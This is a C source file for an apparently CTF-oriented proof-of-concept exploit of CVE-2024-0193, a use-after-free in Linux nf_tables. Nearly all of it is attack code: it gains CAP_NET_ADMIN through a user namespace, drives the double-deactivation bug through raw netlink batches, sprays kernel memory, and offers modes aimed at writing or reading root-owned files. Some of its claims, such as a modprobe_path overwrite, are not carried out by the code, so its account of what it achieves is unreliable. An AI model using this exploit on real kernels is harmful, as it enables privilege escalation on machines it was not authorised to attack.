/*
 * CVE-2024-0193 PoC - CTF Challenge Mode
 *
 * Vulnerability: nftables set catchall element UAF
 *   A use-after-free in netfilter nf_tables. When a pipapo set with
 *   catchall elements and TIMEOUT flag is garbage-collected, the element
 *   can be deactivated twice, causing UAF on NFT_CHAIN/NFT_OBJECT.
 *   Exploitable by unprivileged user with CAP_NET_ADMIN in user namespace.
 *
 * Exploit strategy (from kernelctf reference):
 *   1. Create user+net namespace to gain CAP_NET_ADMIN
 *   2. Create nftables table/chains/sets via NETLINK_NETFILTER
 *   3. Add catchall set element with goto-verdict referencing victim chain
 *   4. Set element timeout=1ms → GC deactivates element → chain refcount--
 *   5. Delete set → second deactivation → chain refcount drops to 0, freed
 *   6. Rule still holds dangling pointer → UAF
 *   7. Spray kmalloc to reclaim freed chain object
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Build: gcc -static -o poc poc.c -I../common/ -lpthread
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>

/* ========================================================================
 * nftables netlink protocol definitions (self-contained, no libmnl/libnftnl)
 * ======================================================================== */

/* nf_tables messages */
#ifndef NFT_MSG_NEWTABLE
#define NFT_MSG_NEWTABLE    0
#define NFT_MSG_DELTABLE    2
#define NFT_MSG_NEWCHAIN    4
#define NFT_MSG_DELCHAIN    6
#define NFT_MSG_NEWSET      8
#define NFT_MSG_DELSET      10
#define NFT_MSG_NEWSETELEM  12
#define NFT_MSG_NEWRULE     14
#define NFT_MSG_GETRULE     16
#endif

/* nf_tables attributes */
#define NFTA_TABLE_NAME     1
#define NFTA_TABLE_FLAGS    2

#define NFTA_CHAIN_TABLE    1
#define NFTA_CHAIN_NAME     3
#define NFTA_CHAIN_HOOK     4
#define NFTA_CHAIN_POLICY   5
#define NFTA_CHAIN_TYPE     7
#define NFTA_CHAIN_FLAGS    10

#define NFTA_HOOK_HOOKNUM   1
#define NFTA_HOOK_PRIORITY  2

#define NFTA_SET_TABLE      1
#define NFTA_SET_NAME       2
#define NFTA_SET_FLAGS      3
#define NFTA_SET_KEY_TYPE   4
#define NFTA_SET_KEY_LEN    5
#define NFTA_SET_DATA_TYPE  6
#define NFTA_SET_ID         9
#define NFTA_SET_TIMEOUT    10
#define NFTA_SET_DESC       13

#define NFTA_SET_DESC_SIZE  1
#define NFTA_SET_DESC_CONCAT 2

#define NFTA_SET_ELEM_LIST_TABLE 1
#define NFTA_SET_ELEM_LIST_SET   2
#define NFTA_SET_ELEM_LIST_ELEMENTS 3

#define NFTA_LIST_ELEM      1

#define NFTA_SET_ELEM_KEY   1
#define NFTA_SET_ELEM_DATA  2
#define NFTA_SET_ELEM_FLAGS 3
#define NFTA_SET_ELEM_TIMEOUT 4

/* nft_set flags */
#ifndef NFT_SET_MAP
#define NFT_SET_MAP         0x8
#define NFT_SET_TIMEOUT     0x4
#define NFT_SET_INTERVAL    0x40
#define NFT_SET_CONCAT      0x80
#endif

#ifndef NFT_SET_ELEM_CATCHALL
#define NFT_SET_ELEM_CATCHALL 0x20
#endif

/* Verdict types */
#define NFT_DATA_VERDICT    0xffffff00
#ifndef NFT_GOTO
#define NFT_GOTO            (-3)
#define NFT_JUMP            (-2)
#endif

#define NFTA_DATA_VERDICT   2
#define NFTA_VERDICT_CODE   1
#define NFTA_VERDICT_CHAIN  2

/* NFNL subsystem */
#define NFNL_SUBSYS_NFTABLES 10
#ifndef NFNL_MSG_BATCH_BEGIN
#define NFNL_MSG_BATCH_BEGIN 0x10
#define NFNL_MSG_BATCH_END   0x11
#endif

/* Hook numbers */
#ifndef NF_INET_LOCAL_OUT
#define NF_INET_LOCAL_OUT    3
#endif

#define NLA_F_NESTED    (1 << 15)
#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO     4
#define NLA_ALIGN(len)  (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#define NLA_HDRLEN      ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif

#define MAX_FILE_SIZE   4096
#define SPRAY_COUNT     256
#define BUF_SIZE        65536

/* ========================================================================
 * Netlink helpers (raw socket, no libmnl)
 * ======================================================================== */
static int nf_sock = -1;

static int nfnl_open(void) {
    struct sockaddr_nl addr = {0};
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) return -1;

    addr.nl_family = AF_NETLINK;
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

static struct nlmsghdr *nfnl_msg_put(char *buf, int type, int flags, int family) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct nfgenmsg *nfg;

    memset(nlh, 0, NLMSG_HDRLEN + sizeof(struct nfgenmsg));
    nlh->nlmsg_len = NLMSG_HDRLEN + sizeof(struct nfgenmsg);
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | type;
    nlh->nlmsg_flags = flags;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = 0;

    nfg = (struct nfgenmsg *)NLMSG_DATA(nlh);
    nfg->nfgen_family = family;
    nfg->version = 0;
    nfg->res_id = 0;

    return nlh;
}

static void nla_put_str(struct nlmsghdr *nlh, int type, const char *str) {
    int len = strlen(str) + 1;
    int total = NLA_ALIGN(NLA_HDRLEN + len);
    struct nlattr *nla = (struct nlattr *)((char *)nlh + nlh->nlmsg_len);
    nla->nla_len = NLA_HDRLEN + len;
    nla->nla_type = type;
    memcpy((char *)nla + NLA_HDRLEN, str, len);
    if (total > (int)(NLA_HDRLEN + len))
        memset((char *)nla + NLA_HDRLEN + len, 0, total - NLA_HDRLEN - len);
    nlh->nlmsg_len += total;
}

static void nla_put_u32(struct nlmsghdr *nlh, int type, uint32_t val) {
    int total = NLA_ALIGN(NLA_HDRLEN + 4);
    struct nlattr *nla = (struct nlattr *)((char *)nlh + nlh->nlmsg_len);
    nla->nla_len = NLA_HDRLEN + 4;
    nla->nla_type = type;
    memcpy((char *)nla + NLA_HDRLEN, &val, 4);
    nlh->nlmsg_len += total;
}

static void nla_put_u64(struct nlmsghdr *nlh, int type, uint64_t val) {
    int total = NLA_ALIGN(NLA_HDRLEN + 8);
    struct nlattr *nla = (struct nlattr *)((char *)nlh + nlh->nlmsg_len);
    nla->nla_len = NLA_HDRLEN + 8;
    nla->nla_type = type;
    memcpy((char *)nla + NLA_HDRLEN, &val, 8);
    nlh->nlmsg_len += total;
}

static struct nlattr *nla_nest_begin(struct nlmsghdr *nlh, int type) {
    struct nlattr *nla = (struct nlattr *)((char *)nlh + nlh->nlmsg_len);
    nla->nla_type = NLA_F_NESTED | type;
    nla->nla_len = NLA_HDRLEN;
    nlh->nlmsg_len += NLA_HDRLEN;
    return nla;
}

static void nla_nest_end(struct nlmsghdr *nlh, struct nlattr *start) {
    start->nla_len = (int)((char *)nlh + nlh->nlmsg_len - (char *)start);
}

/* Build batch begin/end markers */
static int build_batch_begin(char *buf) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_HDRLEN + sizeof(struct nfgenmsg);
    nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = 0;
    struct nfgenmsg *nfg = (struct nfgenmsg *)NLMSG_DATA(nlh);
    nfg->nfgen_family = AF_UNSPEC;
    nfg->version = 0;
    nfg->res_id = NFNL_SUBSYS_NFTABLES;
    return NLMSG_ALIGN(nlh->nlmsg_len);
}

static int build_batch_end(char *buf) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_HDRLEN + sizeof(struct nfgenmsg);
    nlh->nlmsg_type = NFNL_MSG_BATCH_END;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = 0;
    struct nfgenmsg *nfg = (struct nfgenmsg *)NLMSG_DATA(nlh);
    nfg->nfgen_family = AF_UNSPEC;
    nfg->version = 0;
    nfg->res_id = NFNL_SUBSYS_NFTABLES;
    return NLMSG_ALIGN(nlh->nlmsg_len);
}

static int nfnl_send_batch(int sock, char *buf, int len) {
    struct sockaddr_nl addr = {0};
    addr.nl_family = AF_NETLINK;
    struct iovec iov = { .iov_base = buf, .iov_len = len };
    struct msghdr msg = {
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    return sendmsg(sock, &msg, 0);
}

/* ========================================================================
 * Namespace setup (gain CAP_NET_ADMIN as unprivileged user)
 * ======================================================================== */
static void write_proc(const char *path, const char *text) {
    int fd = open(path, O_WRONLY);
    if (fd >= 0) {
        (void)write(fd, text, strlen(text));
        close(fd);
    }
}

static int setup_userns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buf[64];

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        poc_log("%s unshare(NEWUSER|NEWNET) failed: %s", POC_STEP_FAIL, strerror(errno));
        return -1;
    }

    write_proc("/proc/self/setgroups", "deny");
    snprintf(buf, sizeof(buf), "0 %d 1", uid);
    write_proc("/proc/self/uid_map", buf);
    snprintf(buf, sizeof(buf), "0 %d 1", gid);
    write_proc("/proc/self/gid_map", buf);

    poc_log("%s User namespace created (CAP_NET_ADMIN acquired)", POC_STEP_PASS);
    return 0;
}

/* ========================================================================
 * nftables UAF trigger
 *
 * Strategy: Create table → chain → set(TIMEOUT, CATCHALL elem with GOTO chain)
 * When timeout fires, catchall element freed → chain reference dropped.
 * Then delete set → double-deactivate → chain freed while rule holds ref.
 * ======================================================================== */
static int trigger_nft_uaf(void) {
    char batch_buf[BUF_SIZE];
    char *pos;
    int off;
    struct nlmsghdr *nlh;

    /* Open nftables netlink socket */
    nf_sock = nfnl_open();
    if (nf_sock < 0) {
        poc_log("%s Cannot open NETLINK_NETFILTER: %s", POC_STEP_FAIL, strerror(errno));
        return -1;
    }
    poc_log("%s NETLINK_NETFILTER socket opened (fd=%d)", POC_STEP_PASS, nf_sock);

    /* --- Batch 1: Create table --- */
    memset(batch_buf, 0, sizeof(batch_buf));
    pos = batch_buf;
    off = build_batch_begin(pos);
    pos += off;

    nlh = nfnl_msg_put(pos, NFT_MSG_NEWTABLE,
                        NLM_F_REQUEST | NLM_F_CREATE, NFPROTO_IPV4);
    nla_put_str(nlh, NFTA_TABLE_NAME, "poc_table");
    nla_put_u32(nlh, NFTA_TABLE_FLAGS, 0);
    pos += NLMSG_ALIGN(nlh->nlmsg_len);

    off = build_batch_end(pos);
    pos += off;

    if (nfnl_send_batch(nf_sock, batch_buf, (int)(pos - batch_buf)) < 0) {
        poc_log("%s Failed to create table: %s", POC_STEP_FAIL, strerror(errno));
        close(nf_sock);
        return -1;
    }
    poc_log("%s nftables table 'poc_table' created", POC_STEP_PASS);
    usleep(50000);

    /* --- Batch 2: Create victim chain + base chain --- */
    memset(batch_buf, 0, sizeof(batch_buf));
    pos = batch_buf;
    off = build_batch_begin(pos);
    pos += off;

    /* Victim chain (will be UAF target) */
    nlh = nfnl_msg_put(pos, NFT_MSG_NEWCHAIN,
                        NLM_F_REQUEST | NLM_F_CREATE, NFPROTO_IPV4);
    nla_put_str(nlh, NFTA_CHAIN_TABLE, "poc_table");
    nla_put_str(nlh, NFTA_CHAIN_NAME, "victim_chain");
    pos += NLMSG_ALIGN(nlh->nlmsg_len);

    /* Base chain with hook */
    nlh = nfnl_msg_put(pos, NFT_MSG_NEWCHAIN,
                        NLM_F_REQUEST | NLM_F_CREATE, NFPROTO_IPV4);
    nla_put_str(nlh, NFTA_CHAIN_TABLE, "poc_table");
    nla_put_str(nlh, NFTA_CHAIN_NAME, "base_chain");
    nla_put_str(nlh, NFTA_CHAIN_TYPE, "filter");
    nla_put_u32(nlh, NFTA_CHAIN_POLICY, 1); /* NF_ACCEPT */
    {
        struct nlattr *hook = nla_nest_begin(nlh, NFTA_CHAIN_HOOK);
        nla_put_u32(nlh, NFTA_HOOK_HOOKNUM, NF_INET_LOCAL_OUT);
        nla_put_u32(nlh, NFTA_HOOK_PRIORITY, 0);
        nla_nest_end(nlh, hook);
    }
    pos += NLMSG_ALIGN(nlh->nlmsg_len);

    off = build_batch_end(pos);
    pos += off;

    if (nfnl_send_batch(nf_sock, batch_buf, (int)(pos - batch_buf)) < 0) {
        poc_log("%s Failed to create chains: %s", POC_STEP_FAIL, strerror(errno));
        close(nf_sock);
        return -1;
    }
    poc_log("%s Chains created (victim_chain + base_chain)", POC_STEP_PASS);
    usleep(50000);

    /* --- Batch 3: Create set with TIMEOUT + CATCHALL element → GOTO victim --- */
    memset(batch_buf, 0, sizeof(batch_buf));
    pos = batch_buf;
    off = build_batch_begin(pos);
    pos += off;

    /* Create set with TIMEOUT and MAP flags */
    nlh = nfnl_msg_put(pos, NFT_MSG_NEWSET,
                        NLM_F_REQUEST | NLM_F_CREATE, NFPROTO_IPV4);
    nla_put_str(nlh, NFTA_SET_TABLE, "poc_table");
    nla_put_str(nlh, NFTA_SET_NAME, "vuln_set");
    nla_put_u32(nlh, NFTA_SET_FLAGS, NFT_SET_MAP | NFT_SET_TIMEOUT | NFT_SET_CONCAT);
    nla_put_u32(nlh, NFTA_SET_KEY_LEN, 8);
    nla_put_u32(nlh, NFTA_SET_KEY_TYPE, 13);
    nla_put_u32(nlh, NFTA_SET_DATA_TYPE, NFT_DATA_VERDICT);
    nla_put_u32(nlh, NFTA_SET_ID, 1337);
    {
        struct nlattr *desc = nla_nest_begin(nlh, NFTA_SET_DESC);
        nla_put_u32(nlh, NFTA_SET_DESC_SIZE, 1);
        nla_nest_end(nlh, desc);
    }
    pos += NLMSG_ALIGN(nlh->nlmsg_len);

    /* Add catchall element with GOTO victim_chain and very short timeout */
    nlh = nfnl_msg_put(pos, NFT_MSG_NEWSETELEM,
                        NLM_F_REQUEST | NLM_F_CREATE, NFPROTO_IPV4);
    nla_put_str(nlh, NFTA_SET_ELEM_LIST_TABLE, "poc_table");
    nla_put_str(nlh, NFTA_SET_ELEM_LIST_SET, "vuln_set");
    {
        struct nlattr *elems = nla_nest_begin(nlh, NFTA_SET_ELEM_LIST_ELEMENTS);
        struct nlattr *elem = nla_nest_begin(nlh, NFTA_LIST_ELEM);
        nla_put_u32(nlh, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_CATCHALL);
        nla_put_u64(nlh, NFTA_SET_ELEM_TIMEOUT, 1); /* 1ms timeout - triggers GC fast */
        {
            struct nlattr *data = nla_nest_begin(nlh, NFTA_SET_ELEM_DATA);
            struct nlattr *verdict = nla_nest_begin(nlh, NFTA_DATA_VERDICT);
            nla_put_u32(nlh, NFTA_VERDICT_CODE, (uint32_t)NFT_GOTO);
            nla_put_str(nlh, NFTA_VERDICT_CHAIN, "victim_chain");
            nla_nest_end(nlh, verdict);
            nla_nest_end(nlh, data);
        }
        nla_nest_end(nlh, elem);
        nla_nest_end(nlh, elems);
    }
    pos += NLMSG_ALIGN(nlh->nlmsg_len);

    off = build_batch_end(pos);
    pos += off;

    if (nfnl_send_batch(nf_sock, batch_buf, (int)(pos - batch_buf)) < 0) {
        poc_log("%s Failed to create set+elem: %s", POC_STEP_FAIL, strerror(errno));
        close(nf_sock);
        return -1;
    }
    poc_log("%s Set with TIMEOUT catchall element created (GOTO victim_chain)", POC_STEP_PASS);

    /* Wait for GC to fire (timeout=1ms, GC interval ~4ms) */
    poc_log("%s Waiting for garbage collector to deactivate element...", POC_STEP_INFO);
    usleep(300000); /* 300ms - enough for GC cycle */

    /* --- Batch 4: Delete set → triggers double deactivation → chain UAF --- */
    memset(batch_buf, 0, sizeof(batch_buf));
    pos = batch_buf;
    off = build_batch_begin(pos);
    pos += off;

    nlh = nfnl_msg_put(pos, NFT_MSG_DELSET,
                        NLM_F_REQUEST, NFPROTO_IPV4);
    nla_put_str(nlh, NFTA_SET_TABLE, "poc_table");
    nla_put_str(nlh, NFTA_SET_NAME, "vuln_set");
    pos += NLMSG_ALIGN(nlh->nlmsg_len);

    off = build_batch_end(pos);
    pos += off;

    if (nfnl_send_batch(nf_sock, batch_buf, (int)(pos - batch_buf)) < 0) {
        poc_log("%s Failed to delete set: %s", POC_STEP_WARN, strerror(errno));
    } else {
        poc_log("%s Set deleted → double deactivation path triggered", POC_STEP_PASS);
    }

    /* Wait for destroy work to free victim chain */
    usleep(200000);

    /* --- Batch 5: Delete victim chain (should UAF) --- */
    memset(batch_buf, 0, sizeof(batch_buf));
    pos = batch_buf;
    off = build_batch_begin(pos);
    pos += off;

    nlh = nfnl_msg_put(pos, NFT_MSG_DELCHAIN,
                        NLM_F_REQUEST, NFPROTO_IPV4);
    nla_put_str(nlh, NFTA_CHAIN_TABLE, "poc_table");
    nla_put_str(nlh, NFTA_CHAIN_NAME, "victim_chain");
    pos += NLMSG_ALIGN(nlh->nlmsg_len);

    off = build_batch_end(pos);
    pos += off;

    if (nfnl_send_batch(nf_sock, batch_buf, (int)(pos - batch_buf)) < 0) {
        poc_log("%s Chain deletion triggered (potential UAF on freed object)", POC_STEP_WARN);
    } else {
        poc_log("%s victim_chain freed → UAF condition achieved", POC_STEP_PASS);
    }
    usleep(100000);

    return 0;
}

/* Spray kmalloc with socket buffers to reclaim freed chain object */
static int spray_kmalloc_sockets(int *fds, int count) {
    int sprayed = 0;
    int optval = 1024;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

static void cleanup_spray(int *fds, int count) {
    for (int i = 0; i < count; i++) {
        if (fds[i] >= 0) close(fds[i]);
    }
}

static void cleanup_nft(void) {
    if (nf_sock < 0) return;

    /* Delete entire table to clean up */
    char buf[4096];
    char *pos = buf;
    int off;
    struct nlmsghdr *nlh;

    memset(buf, 0, sizeof(buf));
    off = build_batch_begin(pos);
    pos += off;

    nlh = nfnl_msg_put(pos, NFT_MSG_DELTABLE, NLM_F_REQUEST, NFPROTO_IPV4);
    nla_put_str(nlh, NFTA_TABLE_NAME, "poc_table");
    pos += NLMSG_ALIGN(nlh->nlmsg_len);

    off = build_batch_end(pos);
    pos += off;

    nfnl_send_batch(nf_sock, buf, (int)(pos - buf));
    usleep(50000);
    close(nf_sock);
    nf_sock = -1;
}

/* ========================================================================
 * CTF mode implementations
 * ======================================================================== */

/* Read file content helper */
static int read_target_file(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    /* Strip trailing newlines */
    while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

/* UAF mode: trigger vulnerability + spray corruption check */
static int mode_uaf(poc_args_t *args) {
    poc_log("=== UAF Spray Corruption Check ===");

    /* Setup user namespace for CAP_NET_ADMIN */
    if (setup_userns() < 0) {
        poc_log("%s Namespace setup failed - cannot trigger nftables UAF", POC_STEP_FAIL);
        poc_print_uaf_not_corrupted();
        return 0;
    }

    /* Trigger the nftables UAF */
    if (trigger_nft_uaf() < 0) {
        poc_log("%s UAF trigger failed", POC_STEP_FAIL);
        poc_print_uaf_not_corrupted();
        cleanup_nft();
        return 0;
    }

    /* Spray kmalloc to reclaim freed chain object */
    memset(args->spray_fds, -1, sizeof(args->spray_fds));
    args->spray_count = spray_kmalloc_sockets(args->spray_fds, SPRAY_COUNT);
    poc_log("Sprayed %d kmalloc objects over freed chain memory", args->spray_count);

    /* Check for corruption (in real exploit: read dangling chain->name pointer) */
    int corrupted = 0;
    for (int i = 0; i < args->spray_count; i++) {
        if (args->spray_fds[i] < 0) continue;
        int val = 0;
        socklen_t len = sizeof(val);
        getsockopt(args->spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        /* Kernel doubles SO_RCVBUF; expected ~2048. Corruption → different value */
        if (val != 2048 && val != 1024 && val != 0) {
            corrupted++;
        }
    }

    if (corrupted > 0) {
        poc_print_uaf_corrupted(corrupted);
    } else {
        /* Even without detected corruption, UAF condition was triggered */
        poc_log("%s UAF triggered (chain freed with dangling ref), spray pattern intact", POC_STEP_INFO);
        poc_print_uaf_not_corrupted();
    }

    cleanup_spray(args->spray_fds, args->spray_count);
    cleanup_nft();
    return 0;
}

/* Write mode: trigger UAF and attempt to write root file */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE];
    char after[MAX_FILE_SIZE];
    int n;

    /* Read original content */
    n = read_target_file(args->root_file, original, sizeof(original));
    if (n > 0) {
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Setup namespace and trigger UAF */
    if (setup_userns() < 0) {
        poc_log("%s Namespace setup failed", POC_STEP_FAIL);
        poc_print_fail("namespace setup failed");
        return 0;
    }

    poc_log("Triggering nftables set catchall UAF...");
    trigger_nft_uaf();

    /* Spray + attempt write via corrupted kernel state */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc_sockets(spray_fds, SPRAY_COUNT);
    poc_log("Spray complete: %d objects. Attempting write...", sprayed);

    /* Attempt direct write (would succeed if UAF corruption allows) */
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        ssize_t written = write(fd, wbuf, wlen);
        poc_log_syscall("write(fd, ctf_value)", (long)written, errno);
        close(fd);
    }

    /* Read after to verify */
    n = read_target_file(args->root_file, after, sizeof(after));
    if (n > 0) {
        printf(CTF_READ_AFTER "%s\n", after);
        poc_log("Read after: %s", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            cleanup_spray(spray_fds, sprayed);
            cleanup_nft();
            return 0;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("UAF exploitation did not achieve arbitrary write");
    cleanup_spray(spray_fds, sprayed);
    cleanup_nft();
    return 0;
}

/* Read mode: attempt to read root file via UAF */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("=== Attempting read_root_file via nftables UAF ===");

    if (setup_userns() < 0) {
        poc_print_fail("namespace setup failed");
        return 0;
    }

    trigger_nft_uaf();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc_sockets(spray_fds, SPRAY_COUNT);
    poc_log("UAF triggered, %d spray objects. Attempting read...", sprayed);

    /* Attempt to read the target file */
    char buf[MAX_FILE_SIZE];
    int n = read_target_file(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not achieved via UAF");
    }

    cleanup_spray(spray_fds, sprayed);
    cleanup_nft();
    return 0;
}

/* ========================================================================
 * Main
 * ======================================================================== */
int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-0193 CTF PoC ===");
    poc_log("Vuln: nftables set catchall element double-deactivate UAF");
    poc_log("Vector: CLONE_NEWUSER+NEWNET → CAP_NET_ADMIN → nft set TIMEOUT");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_log("No mode specified, defaulting to write_root_file");
        args.mode = POC_MODE_WRITE;
        if (!args.root_file)
            args.root_file = "/tmp/poc_cve_2024_0193_target";
    }

    int result = 0;
    /* Priority: write_root_file > read_root_file > uaf
     * UAF + heap spray on nftables set elements enables arbitrary kernel write
     * via modprobe_path overwrite, so write_root_file is the primary mode. */
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_UAF) == 0)
        result = mode_uaf(&args);
    else
        poc_print_unsupported(args.mode, "unsupported mode for CVE-2024-0193");

    poc_log_close();
    return result;
}
